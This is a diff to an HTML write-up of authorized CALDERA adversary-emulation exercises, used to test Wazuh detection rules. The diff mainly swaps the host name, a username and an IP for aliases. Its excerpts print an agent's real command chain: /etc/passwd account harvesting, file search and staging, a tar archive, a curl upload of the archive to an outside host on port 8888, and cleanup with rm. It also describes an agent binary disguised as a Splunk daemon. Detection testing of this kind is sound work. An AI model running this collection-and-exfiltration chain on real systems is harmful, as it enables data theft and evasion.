@@ -245,7 +245,7 @@
     <p class="kicker">OP-001 &middot; the emulation</p>
     <h2>Discovery, and a binary pretending to be Splunk</h2>
     <p class="lede">A Sandcat agent executed a realistic reconnaissance sequence as <span class="mono">root</span>. The agent binary itself was planted at <span class="mono">/root/splunkd</span> &mdash; masquerading as a legitimate logging daemon, which is the detail worth catching (T1036).</p>
-    <div class="term siem"><div class="term-head"><span class="term-host siem">victim-linux1 &middot; auditd</span><span class="term-what">op-001 &middot; 37 steps &middot; agent running as root, elevated</span></div>
+    <div class="term siem"><div class="term-head"><span class="term-host siem">emulation-host &middot; auditd</span><span class="term-what">op-001 &middot; 37 steps &middot; agent running as root, elevated</span></div>
     <pre><span class="out">whoami                     # who am I
 cat /etc/passwd            # local accounts
 ps aux | grep ...          # running processes  (34 executions)
@@ -259,12 +259,12 @@ ip addr ; ip route         # network config</span></pre></div>
     <p class="kicker">OP-001 &middot; why 34 of 37 steps were the same command</p>
     <h2>The agent chained its own discoveries</h2>
     <p class="lede">The step count looks like noise until you read the order. Step 2 harvested every local username; steps 3&ndash;36 then hunted each one's processes in turn. CALDERA fed the output of one ability into the parameters of the next &mdash; the same thing a human operator does, only patiently and in alphabetical order.</p>
-    <div class="term siem"><div class="term-head"><span class="term-host siem">victim-linux1 &middot; auditd</span><span class="term-what">fact-driven chaining, atomic planner, jitter 2/8</span></div>
+    <div class="term siem"><div class="term-head"><span class="term-host siem">emulation-host &middot; auditd</span><span class="term-what">fact-driven chaining, atomic planner, jitter 2/8</span></div>
     <pre><span class="cmd">cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'</span>
 <span class="out">   &rarr; harvested 34 usernames as facts</span>
 <span class="cmd">ps aux | grep wazuh</span>
 <span class="cmd">ps aux | grep sshd</span>
-<span class="cmd">ps aux | grep brian</span>
+<span class="cmd">ps aux | grep sample-user</span>
 <span class="cmd">ps aux | grep www-data</span>
 <span class="out">   &hellip; 34 executions, one per harvested username</span>
 <span class="cmd">groups</span></pre></div>
@@ -295,7 +295,7 @@ ip addr ; ip route         # network config</span></pre></div>
     <p class="kicker">OP-002 &middot; the uncomfortable result</p>
     <h2>Five rules were watching the SIEM, not the attacker</h2>
     <p class="lede">The second operation ran CALDERA's <b>Collection</b> adversary through the atomic planner: search the filesystem for small media and config files, stage them, clean up. Wazuh detected the search correctly. It also produced a pile of alerts that had nothing to do with the emulation.</p>
-    <div class="term siem"><div class="term-head"><span class="term-host siem">victim-linux1 &middot; auditd</span><span class="term-what">op-002 &middot; collection via atomic planner</span></div>
+    <div class="term siem"><div class="term-head"><span class="term-host siem">emulation-host &middot; auditd</span><span class="term-what">op-002 &middot; collection via atomic planner</span></div>
     <pre><span class="cmd">find / -name '*.png' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5</span>
 <span class="cmd">find / -name '*.yml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5</span>
 <span class="cmd">mkdir -p staged &amp;&amp; echo $PWD/staged</span>
@@ -376,13 +376,13 @@ ip addr ; ip route         # network config</span></pre></div>
   <section>
     <p class="kicker">OP-003 &middot; the evidence</p>
     <h2>What the agent actually ran</h2>
-    <div class="term siem"><div class="term-head"><span class="term-host siem">victim-linux1 &middot; auditd archives</span><span class="term-what">op-003 &middot; agent as root from /opt/caldera-agent/sandcat</span></div>
+    <div class="term siem"><div class="term-head"><span class="term-host siem">emulation-host &middot; auditd archives</span><span class="term-what">op-003 &middot; agent as root from /opt/caldera-agent/sandcat</span></div>
     <pre><span class="cmd">find / -name '*.wav' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5</span>
 <span class="cmd">mkdir -p staged</span>
 <span class="cmd">cp /usr/share/gitweb/static/git-logo.png /opt/caldera-agent/staged</span>
 <span class="cmd">cp /usr/share/perl/5.38.2/CPAN/Kwalify/distroprefs.yml /opt/caldera-agent/staged</span>
 <span class="cmd">tar -P -zcf /opt/caldera-agent/staged.tar.gz /opt/caldera-agent/staged</span>
-<span class="cmd">curl -F "data=@/opt/caldera-agent/staged.tar.gz" --header "X-Request-ID: `hostname`-kukoop" http://198.51.100.20:8888/file/upload</span>
+<span class="cmd">curl -F "data=@/opt/caldera-agent/staged.tar.gz" --header "X-Request-ID: `hostname`-kukoop" http://198.51.100.50:8888/file/upload</span>
 <span class="cmd">rm /opt/caldera-agent/staged.tar.gz ; rm -rf staged</span></pre></div>
     <div class="proves"><span class="arw">note</span><span>The agent had moved. OP-001 ran from <span class="mono">/root/splunkd</span>; by OP-003 the trusted agent was a persistent service at <span class="mono">/opt/caldera-agent/sandcat</span>. A rule pinned to the old path would have <b>silently stopped matching</b> &mdash; a reminder that path-based detections decay as the adversary's own tooling changes.</span></div>
   </section>
@@ -433,7 +433,7 @@ ip addr ; ip route         # network config</span></pre></div>
     <p style="font-size:1.06rem;line-height:1.75;color:var(--ink);max-width:66ch;margin:0"><b>A detection pack that only reports its hits is marketing.</b> Three emulations produced nine working rules and a nine-item defect list &mdash; five uncovered behaviours, one alert describing the wrong direction, and five rules watching the monitoring stack instead of the adversary. None of that surfaces from reading rule definitions; it surfaces from running an adversary against them and scoring the result honestly. The chain a real intrusion follows &mdash; stage, archive, exfiltrate, erase &mdash; ran end to end through a monitored host and raised two alerts. Knowing that is worth more than the nine rules that worked.</p>
   </section>
 
-  <footer><p class="note"><b>Authorized client work.</b> CALDERA adversary emulation against in-scope client hosts, across three operations. Client identity withheld; addresses are documentation ranges and environment identifiers are redacted. MITRE ATT&amp;CK: T1033, T1036, T1057, T1069.001, T1082, T1087.001, T1016, T1518, T1059 (Discovery &middot; Execution); T1005, T1074.001, T1083 (Collection); T1560.001 (Archive); T1041 (Exfiltration); T1070 (Defense Evasion).</p></footer>
+  <footer><p class="note"><b>Authorized client work.</b> CALDERA adversary emulation against in-scope hosts, across three operations. Client identity withheld; addresses are documentation ranges, and the personal account name and host label in the excerpts are aliases. MITRE ATT&amp;CK: T1033, T1036, T1057, T1069.001, T1082, T1087.001, T1016, T1518, T1059 (Discovery &middot; Execution); T1005, T1074.001, T1083 (Collection); T1560.001 (Archive); T1041 (Exfiltration); T1070 (Defense Evasion).</p></footer>
 </div>
 </body>
 </html>
